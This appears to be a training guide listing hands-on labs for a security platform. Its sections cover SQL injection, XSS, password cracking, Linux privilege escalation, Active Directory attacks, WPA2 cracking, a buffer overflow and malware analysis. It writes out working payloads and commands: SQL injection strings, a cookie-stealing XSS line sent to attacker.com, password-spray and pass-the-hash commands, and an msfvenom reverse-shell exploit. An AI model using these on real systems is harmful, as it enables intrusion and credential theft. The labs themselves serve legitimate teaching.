# 🧪 Lab Exercises

**Complexity**: Beginner to Advanced  
**Audience**: Students, Learners, Practitioners  
**Prerequisites**: Varies by lab

This guide contains 50+ hands-on lab exercises covering all major cybersecurity domains.

---

## 📋 Table of Contents

1. [Lab System](#lab-system)
2. [Beginner Labs](#beginner-labs)
3. [Intermediate Labs](#intermediate-labs)
4. [Advanced Labs](#advanced-labs)
5. [Certification Labs](#certification-labs)

---

## 1. Lab System

### Starting Labs

```bash
# List available labs
synos-lab list

# Start a lab
synos-lab start "SQL Injection Basics"

# Check lab status
synos-lab status

# Submit solution
synos-lab submit

# Get hint
synos-lab hint
```

### Lab Environment

Each lab provides:

-   Isolated virtual network
-   Vulnerable target systems
-   All necessary tools
-   Step-by-step guidance
-   Automatic scoring
-   Solution walkthrough (after completion)

---

## 2. Beginner Labs

### 🎯 Lab 1: Command Line Basics

**Duration**: 30 minutes  
**Objective**: Master essential Linux commands  
**Skills**: File navigation, text processing, permissions

```bash
synos-lab start "Command Line Basics"
```

**Tasks**:

1. Navigate filesystem
2. Create/edit files with nano, vim
3. Search files with grep
4. Change permissions with chmod
5. Create bash script

**Success Criteria**: Complete 10 command challenges

---

### 🎯 Lab 2: Network Scanning with Nmap

**Duration**: 45 minutes  
**Objective**: Learn network reconnaissance  
**Skills**: Port scanning, service detection, OS fingerprinting

```bash
synos-lab start "Network Scanning"
```

**Scenario**: You're hired to assess a company's external perimeter. Scan the network and identify all systems.

**Tasks**:

1. Discover live hosts: `nmap -sn 192.168.1.0/24`
2. Scan for open ports: `nmap -sV 192.168.1.10`
3. Identify operating systems: `nmap -O 192.168.1.10`
4. Find vulnerabilities: `nmap --script vuln 192.168.1.10`
5. Generate report

**Questions**:

-   How many hosts are up?
-   What services are running on port 80?
-   What OS is the web server running?
-   Are there any critical vulnerabilities?

---

### 🎯 Lab 3: SQL Injection Basics

**Duration**: 60 minutes  
**Objective**: Understand and exploit SQL injection  
**Skills**: SQL queries, injection techniques, manual exploitation

```bash
synos-lab start "SQL Injection Basics"
```

**Scenario**: Test a vulnerable login form for SQL injection.

**Tasks**:

1. Identify injection point
2. Bypass authentication
3. Enumerate database structure
4. Extract user credentials
5. Gain admin access

**Example Payloads**:

```sql
-- Bypass login
' OR '1'='1' --

-- Enumerate tables
' UNION SELECT table_name, NULL FROM information_schema.tables --

-- Extract data
' UNION SELECT username, password FROM users --
```

**Bonus**: Write a Python script to automate extraction

---

### 🎯 Lab 4: Cross-Site Scripting (XSS)

**Duration**: 45 minutes  
**Objective**: Identify and exploit XSS vulnerabilities  
**Skills**: JavaScript, DOM manipulation, session hijacking

```bash
synos-lab start "XSS Basics"
```

**Tasks**:

1. Find reflected XSS in search form
2. Inject alert box: `<script>alert('XSS')</script>`
3. Steal cookie: `<script>document.location='http://attacker.com/?c='+document.cookie</script>`
4. Create persistent XSS in comment form
5. Perform session hijacking

---

### 🎯 Lab 5: Password Cracking

**Duration**: 40 minutes  
**Objective**: Crack password hashes  
**Skills**: Hash identification, dictionary attacks, rainbow tables

```bash
synos-lab start "Password Cracking"
```

**Tasks**:

1. Identify hash type: `hash-identifier HASH`
2. Crack MD5: `john --format=raw-md5 hashes.txt`
3. Use wordlist: `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
4. Crack with Hashcat: `hashcat -m 0 -a 0 hash.txt rockyou.txt`
5. Create custom wordlist

---

## 3. Intermediate Labs

### 🎯 Lab 10: Privilege Escalation (Linux)

**Duration**: 90 minutes  
**Objective**: Escalate from user to root  
**Skills**: SUID binaries, kernel exploits, misconfigurations

```bash
synos-lab start "Linux Privilege Escalation"
```

**Scenario**: You have shell access as limited user. Escalate to root.

**Enumeration**:

```bash
# Check SUID binaries
find / -perm -4000 2>/dev/null

# Check sudo privileges
sudo -l

# Check kernel version
uname -a

# Check for writable files
find / -writable -type f 2>/dev/null
```

**Exploitation Paths**:

1. **SUID Binary**: Exploit `/usr/bin/custom-tool`
2. **Sudo Misconfiguration**: Abuse `NOPASSWD` entries
3. **Kernel Exploit**: Use CVE-2021-3493
4. **Cron Job**: Modify writable cron script
5. **Capabilities**: Abuse `cap_setuid` capability

---

### 🎯 Lab 11: Active Directory Attack

**Duration**: 120 minutes  
**Objective**: Compromise Active Directory domain  
**Skills**: AD enumeration, Kerberoasting, Pass-the-Hash

```bash
synos-lab start "Active Directory Attack"
```

**Phase 1: Enumeration**

```bash
# Domain enumeration
nmap -p 88,389,445 dc.lab.local

# User enumeration
enum4linux -a dc.lab.local

# BloodHound data collection
bloodhound-python -d lab.local -u user -p password -c all
```

**Phase 2: Initial Access**

```bash
# Password spray
crackmapexec smb dc.lab.local -u users.txt -p 'Winter2024!'

# AS-REP Roasting
GetNPUsers.py lab.local/ -usersfile users.txt -dc-ip 10.10.10.10
```

**Phase 3: Privilege Escalation**

```bash
# Kerberoasting
GetUserSPNs.py -request lab.local/user:password

# Pass-the-Hash
psexec.py -hashes :NTHASH administrator@dc.lab.local
```

---

### 🎯 Lab 12: Web Application Pentest

**Duration**: 120 minutes  
**Objective**: Complete pentest of web application  
**Skills**: OWASP Top 10, manual testing, reporting

```bash
synos-lab start "Web App Pentest"
```

**Methodology**:

1. **Reconnaissance**

    - Directory brute-forcing
    - Technology identification
    - Robots.txt, sitemap

2. **Authentication Testing**

    - Weak credentials
    - SQL injection
    - Session management

3. **Authorization Testing**

    - IDOR vulnerabilities
    - Privilege escalation
    - Access control bypass

4. **Input Validation**

    - XSS (reflected, stored, DOM)
    - Command injection
    - File upload

5. **Business Logic**
    - Race conditions
    - Workflow manipulation
    - Price manipulation

**Deliverable**: Professional pentest report

---

### 🎯 Lab 13: Wireless Network Hacking

**Duration**: 90 minutes  
**Objective**: Compromise wireless networks  
**Skills**: WPA/WPA2 cracking, evil twin, deauth attacks

```bash
synos-lab start "Wireless Hacking"
```

**WPA2 Cracking**:

```bash
# Enable monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauthenticate client
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack handshake
aircrack-ng -w rockyou.txt capture-01.cap
```

---

## 4. Advanced Labs

### 🎯 Lab 20: Buffer Overflow Exploitation

**Duration**: 180 minutes  
**Objective**: Exploit buffer overflow vulnerability  
**Skills**: Assembly, debugging, shellcode, exploit development

```bash
synos-lab start "Buffer Overflow"
```

**Vulnerable Code**:

```c
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
}

int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}
```

**Exploitation Steps**:

1. **Identify Overflow**:

```bash
# Crash the program
./vulnerable $(python3 -c "print('A'*100)")
```

2. **Find Offset**:

```bash
# Create pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

# Find offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41384141
```

3. **Control EIP**:

```bash
# Overwrite EIP with 0x42424242
./vulnerable $(python3 -c "print('A'*76 + 'BBBB')")
```

4. **Bad Characters**:

```python
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  # ... test all bytes
)
```

5. **Find JMP ESP**:

```bash
# Using mona in Immunity Debugger
!mona jmp -r esp -cpb "\x00\x0a\x0d"
```

6. **Generate Shellcode**:

```bash
msfvenom -p linux/x86/shell_reverse_tcp \
  LHOST=10.10.10.5 LPORT=4444 \
  -b '\x00\x0a\x0d' \
  -f python
```

7. **Final Exploit**:

```python
#!/usr/bin/env python3
import struct

buffer = b"A" * 76                    # Padding to EIP
buffer += struct.pack("<I", 0x080414c3) # JMP ESP address
buffer += b"\x90" * 16                # NOP sled
buffer += shellcode                   # Reverse shell

print(buffer)
```

---

### 🎯 Lab 21: Red Team Operation

**Duration**: 480 minutes (2 days)  
**Objective**: Full red team engagement  
**Skills**: All pentesting skills, stealth, persistence

```bash
synos-lab start "Red Team Operation"
```

**Scenario**: You're a red team. Compromise the target organization and maintain access for 48 hours without detection.

**Objectives**:

-   [ ] Gain initial foothold
-   [ ] Establish persistence
-   [ ] Escalate privileges
-   [ ] Move laterally
-   [ ] Exfiltrate sensitive data
-   [ ] Evade detection (blue team is active!)
-   [ ] Document TTPs

**Rules of Engagement**:

-   No DoS attacks
-   No data destruction
-   Stay within scope
-   Report critical findings immediately

---

### 🎯 Lab 22: Malware Analysis

**Duration**: 180 minutes  
**Objective**: Analyze unknown malware sample  
**Skills**: Static/dynamic analysis, reverse engineering, IDA/Ghidra

```bash
synos-lab start "Malware Analysis"
```

**Static Analysis**:

```bash
# File type
file malware.exe

# Strings
strings malware.exe | grep -i "http"

# Hashes
md5sum malware.exe
sha256sum malware.exe

# VirusTotal
vt scan file malware.exe

# PE analysis
pefile-info malware.exe
```

**Dynamic Analysis**:

```bash
# Monitor with Process Monitor
procmon &

# Network monitoring
tcpdump -i eth0 -w traffic.pcap &

# Execute in sandbox
./malware.exe

# Check registry changes
regshot
```

**Reverse Engineering**:

```bash
# Disassemble with Ghidra
ghidra malware.exe

# Debug with GDB
gdb ./malware.exe
```

---

## 5. Certification Labs

### 🎯 SynOS Certified Associate (SCA) Practice

**Duration**: 180 minutes  
**Format**: 20 challenges + 1 full pentest

```bash
synos-lab start "SCA Practice Exam"
```

**Topics Covered**:

-   Basic Linux commands (5 challenges)
-   Network scanning (3 challenges)
-   Web vulnerabilities (5 challenges)
-   Basic exploitation (4 challenges)
-   Password cracking (3 challenges)
-   Full pentest (30 points)

**Passing Score**: 70/100

---

### 🎯 SynOS Certified Professional (SCP) Practice

**Duration**: 360 minutes  
**Format**: 5 machines to compromise

```bash
synos-lab start "SCP Practice Exam"
```

**Machines**:

1. **Web Server** (20 points): SQL injection → RCE
2. **File Server** (20 points): SMB enumeration → privilege escalation
3. **Domain Controller** (25 points): Kerberoasting → DCSync
4. **DMZ Server** (20 points): Buffer overflow
5. **Pivot Machine** (15 points): Lateral movement

**Passing Score**: 70/100

---

## 📊 Lab Statistics

Track your progress:

```bash
# View completed labs
synos-lab history

# View statistics
synos-lab stats

# Export certificate
synos-lab export-cert
```

**Progress Dashboard**:

-   Labs completed: 25/50
-   Average score: 87%
-   Time spent: 45 hours
-   Skills acquired: 35
-   Badges earned: 12

---

## 🏆 Achievements

Earn badges by completing labs:

-   **First Blood**: Complete first lab
-   **Script Kiddie**: Complete 10 labs
-   **Pentester**: Complete 25 labs
-   **Elite Hacker**: Complete all labs with 90%+
-   **Speed Demon**: Complete lab in record time
-   **Perfect Score**: 100% on any lab

---

## 📚 Resources

-   **Lab Documentation**: `/home/synos/labs/README.md`
-   **Video Walkthroughs**: `synos-lab video LAB_NAME`
-   **Community Solutions**: https://community.synos.dev/labs
-   **Support**: labs@synos.dev

---

**Last Updated**: October 4, 2025  
**Total Labs**: 50  
**New Labs Added**: Weekly  
**License**: MIT
